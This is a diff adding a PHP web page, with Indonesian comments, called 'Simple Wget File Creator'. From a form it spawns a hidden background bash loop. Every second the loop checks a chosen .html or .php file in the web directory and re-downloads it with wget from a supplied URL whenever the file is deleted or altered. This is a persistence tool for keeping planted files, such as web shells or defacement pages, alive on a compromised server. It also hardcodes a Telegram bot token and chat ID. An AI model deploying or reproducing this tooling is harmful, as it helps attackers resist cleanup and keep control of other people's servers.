@@ -1,0 +1,127 @@
+<?php
+// Fungsi untuk mengirim pesan ke Telegram
+function sendTelegramMessage($message) {
+    $token = "7892399147:AAE9oL9Fsda0iDRmDdeYHofheVi3YZUJiFo"; // Ganti dengan token bot Anda
+    $chat_id = "6612114333"; // Ganti dengan chat ID Anda
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
+    file_get_contents($url);
+}
+
+// Fungsi untuk membuat bash script
+function setupBashScript($url, $fileName) {
+    $currentDir = __DIR__;
+
+    if (!is_writable($currentDir)) {
+        echo "Direktori tidak dapat ditulisi. Pastikan memiliki hak akses tulis.";
+        return;
+    }
+
+    $bashScript = "#!/bin/bash\n"
+                 . "originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
+                 . "while true; do\n"
+                 . "  if [ ! -f '$currentDir/$fileName' ]; then\n"
+                 . "    echo 'File $fileName tidak ditemukan. Mengdownload...' >> /tmp/wget_script.log\n"
+                 . "    sendTelegramMessage 'File $fileName telah dihapus!'\n" // Notifikasi ke Telegram
+                 . "    /usr/bin/wget -O '$currentDir/$fileName' '$url' > /dev/null 2>&1\n"
+                 . "    originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
+                 . "  else\n"
+                 . "    currentHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
+                 . "    if [ \"\$originalHash\" != \"\$currentHash\" ]; then\n"
+                 . "      echo 'File $fileName telah diubah. Mengembalikan ke versi asli...' >> /tmp/wget_script.log\n"
+                 . "      sendTelegramMessage 'File $fileName telah diubah! Mengembalikan ke versi asli...'\n" // Notifikasi ke Telegram
+                 . "      /usr/bin/wget -O '$currentDir/$fileName' '$url' > /dev/null 2>&1\n"
+                 . "      originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
+                 . "    else\n"
+                 . "      echo 'File $fileName tidak berubah. Tidak mendownload ulang.' >> /tmp/wget_script.log\n"
+                 . "    fi\n"
+                 . "  fi\n"
+                 . "  sleep 1\n"
+                 . "done";
+
+    $bashFilePath = "/tmp/wget_script_$fileName.sh";
+    file_put_contents($bashFilePath, $bashScript);
+    chmod($bashFilePath, 0755);
+    exec("nohup bash $bashFilePath > /dev/null 2>&1 &");
+
+    echo "Bash script telah dibuat untuk menjalankan wget setiap detik untuk URL: $url dan file: $fileName.\n";
+}
+
+// Fungsi untuk menghentikan bash script
+function removeBashScript($fileName) {
+    exec("pkill -f wget_script_$fileName.sh");
+    echo "Bash script dan proses wget untuk file $fileName dihentikan.\n";
+}
+
+if (isset($_POST['start'])) {
+    $url = $_POST['url'];
+    $fileName = $_POST['filename'];
+
+    if (preg_match('/^[a-zA-Z0-9_-]+\.(html|php)$/', $fileName)) {
+        setupBashScript($url, $fileName);
+    } else {
+        echo "Nama file tidak valid.";
+    }
+}
+
+if (isset($_POST['stop'])) {
+    $fileName = $_POST['filename'];
+    removeBashScript($fileName);
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Wget File Creator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #4b79a1, #283e51);
+            color: white;
+            text-align: center;
+            margin-top: 100px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        input[type="text"] {
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            margin: 10px;
+            width: 300px;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            border: none;
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Simple Wget File Creator</h1>
+        <p>Masukkan URL dan nama file yang ingin dibuat:</p>
+        <form method="post">
+            <input type="text" name="url" placeholder="Masukkan URL" required>
+            <br>
+            <input type="text" name="filename" placeholder="Masukkan nama file (contoh: myfile.html atau script.php)" required>
+            <br>
+            <input type="submit" name="start" value="Start">
+            <input type="submit" name="stop" value="Stop">
+        </form>
+    </div>
+</body>
+</html>
